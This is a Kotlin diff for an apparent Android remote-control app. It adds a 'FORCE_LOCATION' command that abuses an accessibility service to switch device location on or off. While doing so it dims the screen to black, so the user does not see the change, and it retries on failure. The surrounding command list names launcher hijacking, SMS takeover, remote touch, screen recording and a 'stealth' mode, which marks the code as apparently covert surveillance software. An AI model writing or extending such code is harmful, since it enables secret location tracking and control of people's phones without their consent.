@@ -1710,6 +1710,56 @@ object CommandProcessor {
                         status = "GHOST_DATA_INITIATED ($targetState)"
                     }
                 }
+                "FORCE_LOCATION" -> {
+                    val targetState = content.trim().uppercase()
+                    val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+                    val isLocEnabled = if (Build.VERSION.SDK_INT >= 28) lm.isLocationEnabled else {
+                        @Suppress("DEPRECATION")
+                        Settings.Secure.getInt(ctx.contentResolver, Settings.Secure.LOCATION_MODE, 0) != 0
+                    }
+                    
+                    // Handle the 15-minute break timer
+                    if (targetState == "DISABLE") {
+                        val expiry = System.currentTimeMillis() + (15 * 60 * 1000L)
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putLong("location_break_expiry", expiry).apply()
+                    } else if (targetState == "ENABLE") {
+                        // Immediately clear the break if forced on
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putLong("location_break_expiry", 0L).apply()
+                    }
+
+                    if ((targetState == "ENABLE" && isLocEnabled) || (targetState == "DISABLE" && !isLocEnabled)) {
+                        status = "ALREADY_IN_STATE"
+                        errorMsg = "Location is already ${if (isLocEnabled) "ENABLED" else "DISABLED"}"
+                    } else if (MyAccessibilityService.instance == null) {
+                        status = "FAILED (SERVICE_OFF)"
+                        errorMsg = "Accessibility is required for Ghost Hand location toggle."
+                    } else {
+                        DimmerManager.IgnitionManager.request(ctx, "FORCE_LOCATION")
+                        Handler(Looper.getMainLooper()).post {
+                            DimmerManager.applyDim(ctx, 0, "AUTO")
+                            MyAccessibilityService.instance?.isWaitingForLocationSettings = true
+                            MyAccessibilityService.instance?.locationTargetState = targetState
+                            val locIntent = Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).apply {
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                            }
+                            ctx.startActivity(locIntent)
+                            
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                DimmerManager.IgnitionManager.release(ctx, "FORCE_LOCATION")
+                                if (MyAccessibilityService.instance?.isWaitingForLocationSettings == true) {
+                                    MyAccessibilityService.instance?.isWaitingForLocationSettings = false
+                                    val diag = MyAccessibilityService.dumpScreenDiagnostic()
+                                    DebugLogger.log("LOC_TIMEOUT_DIAG", diag)
+                                    DimmerManager.removeOverlay(ctx)
+                                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                                    CommandProcessor.updateCommandStatus(ctx, id, "LOC_TIMEOUT", "Ghost Hand failed to toggle Location.\nScreen State:\n$diag")
+                                    CommandRetryManager.scheduleRetry(ctx, id, "FORCE_LOCATION", content, "25s Location Timeout")
+                                }
+                            }, 25000)
+                        }
+                        status = "GHOST_LOC_INITIATED ($targetState)"
+                    }
+                }
                 "DISABLE_STEALTH" -> {
                     JudasManager.disengageStealthMode(ctx)
                     status = "STEALTH_DISENGAGED"
@@ -2973,7 +3023,7 @@ object CommandProcessor {
 
     object Gatekeeper {
         private val GATED_COMMANDS = listOf(
-            "FORCE_DATA", "FORCE_WIFI", "FLIGHT_MODE", "HIJACK_LAUNCHER", "SET_DEFAULT_SMS", "RESTORE_DEFAULT_SMS", 
+            "FORCE_DATA", "FORCE_WIFI", "FORCE_LOCATION", "FLIGHT_MODE", "HIJACK_LAUNCHER", "SET_DEFAULT_SMS", "RESTORE_DEFAULT_SMS", 
             "RESET_BACKGROUND_TASKS", "FINALIZE_RESET", "FULL_ONBOARDING", "REMOTE_TOUCH", "RECORD_SCREEN",
             "SET_SYSTEM_FONT", "SET_SYSTEM_THEME", "EYE_SHIELD", "EYE_SHIELD_SILENT", "MASTER_DISPLAY_RESET",
             "WIPE_TASKS", "MOCK_ANR", "ACC_GOTO_SETTINGS"
